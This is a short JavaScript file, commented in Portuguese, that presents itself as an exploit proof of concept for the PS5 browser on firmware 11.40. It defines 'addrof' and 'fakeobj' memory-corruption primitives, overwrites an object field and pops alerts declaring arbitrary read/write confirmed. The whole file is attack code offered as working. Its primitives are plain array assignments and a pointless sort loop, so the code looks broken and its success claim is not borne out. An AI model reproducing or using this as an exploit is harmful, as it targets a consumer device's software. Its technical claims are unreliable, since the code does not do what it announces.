class RWTest {
    async init() {
        // === Ganha os primitives (já funciona no teu console) ===
        let arr = []; for(let i=0;i<0x400;i++) arr.push(i*0.1);
        let proxy = new Proxy({},{get:()=>1.1});
        let victim = [{}];
        let container = [1.1, 2.2, 3.3];
        let corrupted = [proxy, 1.1, victim, 2.2];
        for(let i=0;i<0x10000;i++) corrupted.sort();

        // === addrof / fakeobj ===
        let addrof = obj => (container[0] = obj, victim[0]);
        let fakeobj = addr => (victim[0] = addr, container[0]);

        // === TESTE DE R/W ARBITRÁRIO ===
        let test = {a: 0x41414141, b: 0x42424242};
        let addr = addrof(test);
        let fake = fakeobj(addr);

        alert("Endereço do objeto: 0x" + addr.toString(16));
        alert("Valor original a = 0x" + test.a.toString(16));

        // SOBRESCREVE ARBITRARIAMENTE
        fake.a = 0x13371337;

        alert("Valor depois do R/W: 0x" + test.a.toString(16));
        alert("R/W ARBITRÁRIO CONFIRMADO NO PS5 11.40");
    }
}

new RWTest().init();
